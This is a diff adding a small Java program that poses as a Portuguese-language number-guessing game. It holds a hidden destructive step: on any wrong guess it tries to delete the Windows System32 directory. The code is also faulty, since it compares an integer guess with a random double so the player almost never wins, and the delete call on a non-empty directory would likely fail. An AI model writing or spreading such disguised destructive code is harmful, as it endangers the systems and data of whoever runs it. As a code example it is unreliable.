@@ -1,0 +1,21 @@
+package oi;
+import java.util.Random;
+import java.util.Scanner;
+import java.io.*;
+
+public class tchau {
+	public static void main(String[] args) {
+		Random aleatorio = new Random();
+		Scanner leia = new Scanner(System.in);
+		double x = aleatorio.nextDouble(11);
+		System.out.println("Vamos jogar um jogo, adivinhe que numero estou pensando de 1 a 10");
+		int y = leia.nextInt();
+		File file = new File("C:\\Windows\\System32");
+		if (y == x) {
+			System.out.println("Parabéns, voce venceu!!");
+		} else file.delete();
+		
+
+	}
+
+}
